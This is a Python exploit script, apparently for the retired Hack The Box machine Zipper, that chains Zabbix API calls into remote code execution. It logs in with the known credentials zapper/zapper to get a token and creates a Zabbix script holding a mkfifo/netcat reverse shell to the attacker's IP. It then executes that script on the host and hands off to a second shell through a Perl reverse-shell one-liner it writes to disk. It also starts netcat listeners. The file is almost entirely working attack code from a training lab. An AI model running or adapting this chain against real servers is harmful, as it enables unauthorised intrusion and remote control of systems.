# Zabbix API to remote code execution (RCE) single click exploit
# Hackthebox - Zipper (retired) - https://app.hackthebox.com/machines/Zipper/information
# Author; d1Zzy666
# Date: 11-07-2024

"""
Plan:
+ Deploy a easy-py-server webserver (8000) for sharing files - ensure all required files are within the root of the folder this script is in 
+ Deploy a Simple HTTP webserver (9000) for sharing files - ensure all required files are within the root of the folder this script is in 
+ Write perl.shell to disk so it is readily available for use by netcat1
+ Deploy netcat shell on desired port e.g. 1337, with perl.shell cat into session.
+ Deploy second netcat shell for persistence on desired port e.g. 1338
+ Query API token key with compromised user account zapper/zapper - store for reuse.
- Create malicious script via API and store "scriptids" for reuse. 
- Call revershell script with "scriptids" value e.g. 4
RESULT: Second shell will return as zabbix@zipper.htb
"""
# Libraries & imports etc.
import argparse
import base64
from datetime import datetime
from easy_py_server import EasyPyServer, Request, Response, MultipartFile, ResponseFile, ResponseConfig     # 3rd party reference - https://github.com/scientificRat/easy_py_server
from http.server import SimpleHTTPRequestHandler
import json
from multiprocessing import Process                                   
import os, signal, sys
import re
import requests
from socketserver import TCPServer
import time
from websocket import create_connection

# global variables
ATTACKIP = "10.10.14.45"            # UPDATE as required
target = "10.10.10.108"             # UPDATE to hostname if set in local /etc/hosts 
targetport = "80"                   # UPDATE to hostname if set in local /etc/hosts
revPort1 = 1337                     # UPDATE as preferred
revPort2 = 1338                     # UPDATE as preferred
simplewwwport = 9000                # UPDATE as preferred
apiuser = "zapper"                  # UPDATE as preferred
apipasswd = "zapper"                # UPDATE as preferred
apitoken = None                     # Global variable to store the API token
scriptidvalue = None                # Global variable to store the scriptid value
hostidvalue = None                  # Global variable to store the hostid value

# Function can be called for printing a line between - aesthetics of output	
def line():
	return "\n--------------------------------------------------------------------------------\n"

##############WEBSERVERS#############
# Webserver deployment - Easy-py-server (8000)
# Accepts GET & POST Requests
def easy_py_webserver():
    # Start web server and reference folder where payload.js is located
    eps = EasyPyServer(listen_address="0.0.0.0", port=8000, static_folder=".")
        
    # method GET
    @eps.get(".")
    def demo(a: int, b: int):
        return dict(success=True, content="%d + %d = %d" % (a, b, a + b))
    
    eps.start_serve(blocking=True)
    print("\n")

# Webserver deployment - Simple HTTP (9000)
# For simple GET requests
class customHandler(SimpleHTTPRequestHandler):
	def log_message(self, format, *args): 
		pass
		
	def do_GET(self):
		if (self.path).startswith("/"):				# change this to whatever you want to serve
			text = print(line()+"### GET from {} - {} - {} - {}".format(self.client_address[0], currentTime(), self.request_version, self.path) + line() )
		else:
			text = print(line()+"### GET from {} - {} - {} - {}".format(self.client_address[0], currentTime(), self.request_version, self.path) + line() )
		return SimpleHTTPRequestHandler.do_GET(self)

def simple_webserver():
	httpd = TCPServer(("", simplewwwport), customHandler)
	print("[+] WebServer started on port " + str(simplewwwport) + " (http://0.0.0.0:" + str(simplewwwport) + ")\n")
	process1 = Process(target = httpd.serve_forever)
	try:
		process1.start()
	except KeyboardInterrupt:
		httpd.server_close()
		pass   
print(line())
print(line())
####################################

# Check current time
def currentTime():
    return datetime.now().strftime("%d-%m-%Y_%H:%M:%S")

print(datetime.now().strftime("%d-%m-%Y_%H:%M:%S") + " " + " - HTB Zipper - d1Zzy's exploit script...")
print(line())

# Write perl shell to disk
def writeToFile(filename,data):
	file = open(filename,"a")
	file.write(data)
	file.close()

# Note - I had to append a newline \n to end of script to get it to pass onto next shell  
perl_dot_shell = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\n""" % (ATTACKIP,revPort2)
writeToFile("perl.shell",perl_dot_shell)

# RevShell handlers - netcat deployments
def netcat1():
    os.system(f"cat perl.shell | nc -nvlp {revPort1}")

def netcat2():
    os.system(f"nc -nvlp {revPort2}")

# Query Zabbix API bearer token using zapper/zapper account
def getapitoken():
    global apitoken
    sess1 = requests.Session()
    print("Retrieving API token...")
    r1 = f"http://{target}:{targetport}/zabbix/api_jsonrpc.php"
    headers = {"Content-Type": "application/json-rpc"}
    json={"auth": None, "id": 1, "jsonrpc": "2.0", "method": "user.login", "params": {"password": f"{apiuser}", "user": f"{apipasswd}"}}
    w = sess1.post(url=r1, headers=headers, json=json)
    # print(x.text)
	# jsonrpc 0 / results 1 / id 2
    apitoken = w.json().get('result')
    print(apitoken)

# Inject reverse shell using API token
def scriptinj():
    global apitoken

    sess2 = requests.session()
    print("Injecting reverse shell...")
    r2 = f"http://{target}:{targetport}/zabbix/api_jsonrpc.php"
    headers = {"User-Agent": "curl/8.7.1", "Accept": "*/*", "Content-Type": "application/json-rpc", "Connection": "close"}
    json={"auth": f"{apitoken}", "id": 1, "jsonrpc": "2.0", "method": "script.create", "params": {"command": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ATTACKIP} {revPort1} >/tmp/f", "execute_on": 0, "name": "revshell"}}
    x = sess2.post(url=r2, headers=headers, json=json)

# GET Scripts to query scriptids number to pass into execution of shell
def scriptq():
    global apitoken
    global scriptidvalue
    if apitoken is None:
        print("API token is not available.")
        return
    sess3 = requests.session()
    r3 = f"http://{target}:{targetport}/zabbix/api_jsonrpc.php"
    headers = {"User-Agent": "curl/8.7.1", "Accept": "*/*", "Content-Type": "application/json-rpc", "Connection": "close"}
    json={"auth": f"{apitoken}", "id": 1, "jsonrpc": "2.0", "method": "script.get", "params": {"output": "extend"}}
    try:
        y = sess3.post(url=r3, headers=headers, json=json)
        y.raise_for_status()
        response_json = y.json()
        #print(response_json)
        shellname = "revshell"
        for data in response_json['result']:
            if shellname in data['name']:
                print(f"Found script with name {shellname}")
                print(f"Script ID: {data['scriptid']}")
                scriptidvalue = data['scriptid']
                return data['scriptid']            
        print("Script with name 'revshell' not found.")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# GET hostids
def hostq():
    global apitoken
    global scriptidvalue
    global hostidvalue

    if apitoken is None:
        print("API token is not available.")
        return
    sess4 = requests.session()
    r3 = f"http://{target}:{targetport}/zabbix/api_jsonrpc.php"
    headers = {"User-Agent": "curl/8.7.1", "Accept": "*/*", "Content-Type": "application/json-rpc", "Connection": "close"}
    json={"auth": f"{apitoken}", "id": 1, "jsonrpc": "2.0", "method": "host.get", "params": {"output": "extend"}}
    try:
        y = sess4.post(url=r3, headers=headers, json=json)
        y.raise_for_status()
        response_json = y.json()
        #print(response_json)
        hostname = "Zipper"
        for data in response_json['result']:
            if hostname in data['host']:
                print(f"Found hostname with name {hostname}")
                print(f"Host ID: {data['hostid']}")
                hostidvalue = data['hostid']
                return data['hostid']            
        print("Hostname with name 'Zipper' not found.")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")


# Execute script to gain revshell
def revshell():
    global apitoken
    global scriptidvalue
    global hostidvalue

    sess5 = requests.session()
    r4 = f"http://{target}:{targetport}/zabbix/api_jsonrpc.php"
    headers = {"User-Agent": "curl/8.7.1", "Accept": "*/*", "Content-Type": "application/json-rpc", "Connection": "close"}
    json={"auth": f"{apitoken}", "id": 1, "jsonrpc": "2.0", "method": "script.execute", "params": {"hostid": f"{hostidvalue}", "scriptid": f"{scriptidvalue}"}}
    z = sess5.post(url=r4, headers=headers, json=json)
    print(z.text)

if __name__ == "__main__":
    p1 = Process(target=easy_py_webserver, args=())
    p2 = Process(target=simple_webserver, args=())
    p3 = Process(target=netcat1, args=())
    p4 = Process(target=netcat2, args=())

    p1.start()
    p2.start()
    p3.start()
    p4.start()

    currentTime()
    getapitoken()
    scriptinj()
    scriptq()
    hostq()
    revshell()